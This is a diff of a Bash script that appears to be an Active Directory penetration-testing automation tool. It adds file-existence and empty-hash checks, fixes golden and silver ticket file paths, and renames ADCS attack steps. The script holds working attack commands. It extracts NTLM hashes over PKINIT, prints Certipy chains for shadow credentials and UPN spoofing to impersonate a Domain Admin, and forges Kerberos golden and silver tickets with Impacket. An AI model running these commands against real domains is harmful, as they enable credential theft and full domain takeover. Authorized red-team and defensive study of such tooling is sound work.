@@ -682,13 +682,17 @@ authenticate() {
     if [ "${cert_bool}" == true ]; then
         echo -e "${YELLOW}[!]${NC} WARNING only netexec, ldeep , Certipy and bloodyAD currently support certificate authentication.${NC}"
         echo -e "${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}"
+        if ! stat "${pfxcert}" >/dev/null 2>&1; then
+            echo -e ""
+            echo -e "${RED}[-]${NC} Certificate file not found!"
+            exit 1
+        fi
         pkinit_auth
         $(which openssl) pkcs12 -in "${pfxcert}" -out "${Credentials_dir}/${user}.pem" -nodes -passin pass:""
         if stat "${Credentials_dir}/${user}.pem" >/dev/null 2>&1; then
             pem_cert="${Credentials_dir}/${user}.pem"
             echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${Credentials_dir}/${user}.pem'"
         fi
-
     fi
 
     #Check if NTLM hash is used, and complete with empty LM hash (also uses NTLM extracted from PKINIT)
@@ -2011,7 +2015,7 @@ adcs_vuln_parse() {
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
             echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin:${NC}"
+            echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin (UPN spoofing):${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
             echo -e "${certipy} req -username <second_user>@${dc_domain} -hash <second_user_hash> -target [ ${pki_servers} ] -ca [ \"${pki_cas//SPACE/ }\" ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapbindsign_param}"
@@ -2029,7 +2033,7 @@ adcs_vuln_parse() {
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Retrieve second_user's NT hash Shadow Credentials (GenericWrite against second_user):${NC}"
             echo -e "${certipy} shadow auto ${argument_certipy} -account <second_user> -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
-            echo -e "${CYAN}2. Change userPrincipalName of user2 to Domain Admin or DC:${NC}"
+            echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin or DC (UPN spoofing):${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn ${dc_NETBIOS}\\\$@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapbindsign_param}"
             echo -e "${CYAN}3. Request certificate permitting client authentication as second_user:${NC}"
@@ -4650,7 +4654,9 @@ pkinit_auth() {
         run_command "${certipy} auth -pfx '${user}_unprotected.pfx' -dc-ip ${dc_ip} -username '${user}' -domain ${domain} ${ldaps_param}" | tee -a "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt"
     fi
     hash=$(grep "Got hash for" "${Credentials_dir}/certipy_PKINIT_output_${user_var}.txt" | cut -d ":" -f 2,3 | cut -d " " -f 2 | tr -d '[:space:]')
-    echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
+    if [[ ! -z "${hash}" ]]; then
+        echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
+    fi
     cd "${current_dir}" || exit
 }
 
@@ -5363,7 +5369,7 @@ kerberos_menu() {
                 current_dir=$(pwd)
                 cd "${Credentials_dir}" || exit
                 run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} ${tick_user_id} ${tick_groups} ${tick_randuser}"
-                if stat "${Credentials_dir}/${tick_randuser}_golden.ccache" >/dev/null 2>&1; then
+                if stat "${Credentials_dir}/${tick_randuser}.ccache" >/dev/null 2>&1; then
                     run_command "${impacket_ticketconverter} './${tick_randuser}.ccache' './${tick_randuser}.kirbi'"
                     echo -e "${GREEN}[+] Golden ticket generated successfully:${NC}"
                     echo -e "${Credentials_dir}/${tick_randuser}_golden.ccache"
@@ -5438,7 +5444,7 @@ kerberos_menu() {
                 run_command "${impacket_ticketer} ${gethash_key} -domain-sid ${sid_domain} -domain ${domain} -spn ${tick_spn} ${tick_randuserid} ${tick_randuser}"
                 ticket_ccache_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').ccache"
                 ticket_kirbi_out="${tick_randuser}_silver_$(echo "${tick_spn}" | sed 's/\//_/g').kirbi"
-                if stat "${Credentials_dir}/${ticket_ccache_out}" >/dev/null 2>&1; then
+                if stat "${Credentials_dir}/${tick_randuser}.ccache" >/dev/null 2>&1; then
                     run_command "${impacket_ticketconverter} './${tick_randuser}.ccache' './${tick_randuser}.kirbi'"
                     echo -e "${GREEN}[+] Silver ticket generated successfully:${NC}"
                     echo -e "${Credentials_dir}/${ticket_ccache_out}"
